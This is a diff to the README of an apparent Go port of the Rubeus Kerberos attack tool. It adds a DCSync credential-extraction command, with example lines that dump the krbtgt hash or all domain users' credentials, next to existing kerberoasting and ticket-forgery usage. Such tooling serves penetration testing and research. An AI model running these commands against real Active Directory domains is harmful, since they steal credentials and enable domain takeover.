@@ -16,6 +16,7 @@ A comprehensive Go implementation of [Rubeus](https://github.com/GhostPack/Rubeu
 | **Ticket Management** | `ptt`, `dump`, `triage`, `klist`, `describe`, `purge`, `tgtdeleg`, `monitor`, `harvest` |
 | **Forgery** | `golden`, `silver`, `diamond`, `sapphire` |
 | **Roasting** | `kerberoast`, `asreproast` |
+| **Credential Extraction** | `dcsync` |
 | **Utilities** | `hash`, `createnetonly`, `changepw`, `currentluid`, `logonsession` |
 
 ## Quick Start
@@ -25,6 +26,9 @@ A comprehensive Go implementation of [Rubeus](https://github.com/GhostPack/Rubeu
 ```bash
 # Build for Windows
 GOOS=windows GOARCH=amd64 go build -o goobeus.exe ./cmd/goobeus
+
+# Build for Linux  
+go build -o goobeus ./cmd/goobeus
 ```
 
 ### Usage Examples
@@ -47,6 +51,12 @@ goobeus.exe kerberoast --domain corp.local --spn MSSQLSvc/sql01.corp.local:1433
 
 # AS-REP Roast
 goobeus.exe asreproast --domain corp.local --dc dc01.corp.local
+
+# DCSync - extract single user credentials
+goobeus -d corp.local -u admin -p 'Password!' dcsync --user krbtgt --dc dc01.corp.local
+
+# DCSync - dump ALL domain users (like secretsdump)
+goobeus -d corp.local -u admin -p 'Password!' dcsync --all --dc dc01.corp.local
 
 # Dump tickets from current session
 goobeus.exe dump
@@ -110,6 +120,7 @@ See the [docs/](docs/) directory for in-depth educational content:
 - [TICKETS.md](docs/TICKETS.md) - Ticket structure and formats
 - [ATTACKS.md](docs/ATTACKS.md) - Attack techniques explained
 - [DELEGATION.md](docs/DELEGATION.md) - Delegation abuse
+- [TGTDELEG_IMPLEMENTATION.md](docs/TGTDELEG_IMPLEMENTATION.md) - Go implementation deep dive
 
 ## Credential Formats
 
